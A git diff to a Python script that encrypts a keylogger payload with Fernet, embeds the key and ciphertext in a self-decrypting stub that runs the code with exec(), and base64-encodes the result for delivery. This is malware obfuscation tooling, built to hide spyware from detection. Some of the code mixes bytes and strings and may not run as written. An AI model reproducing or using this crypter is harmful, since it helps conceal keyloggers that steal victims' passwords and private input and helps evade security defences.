@@ -1,5 +1,5 @@
 import base64
-#import some_encryption_module
+from cryptography.fernet import Fernet
 
 #Into payload copy the python file's content (e.g. keylogger-usage.pyw)
 payload = """
@@ -20,12 +20,28 @@ with Listener(on_press=on_press) as listener:
     listener.join()
 """
 
+def encrypt(payload):
+    key = Fernet.generate_key()
+    f = Fernet(key)
+    token = f.encrypt(payload)
+    #encodedBytes = f.decrypt(token)
+    return (token,key)
+
 if __name__ == "__main__":
 
-    #enc_payload = encrypt(payload)
-    enc_payload = payload
+    # Encrypt payload
+    (enc_payload,key) = encrypt(payload)
 
-    # Standard Base64 Encoding
-    encodedBytes = base64.b64encode(enc_payload.encode("UTF-8"))
-    encodedStr = str(encodedBytes).decode("UTF-8")
-    print(encodedStr)
+    # Create executable string for payload decryptor
+    payload_decryptor = "key = '" + key + "'\nepl = '" + enc_payload + "'\n" + """from cryptography.fernet import Fernet\nf = Fernet(key)\nc = f.decrypt(epl)\nexec(c)"""
+
+    # Base64 everything
+    encodedBytes = base64.b64encode(payload_decryptor.encode("UTF-8"))
+    print("Encrypt-Encoded Payload:")
+    print(encodedBytes)
+    #print("Key:")
+    #print(key)
+    
+
+    
+    
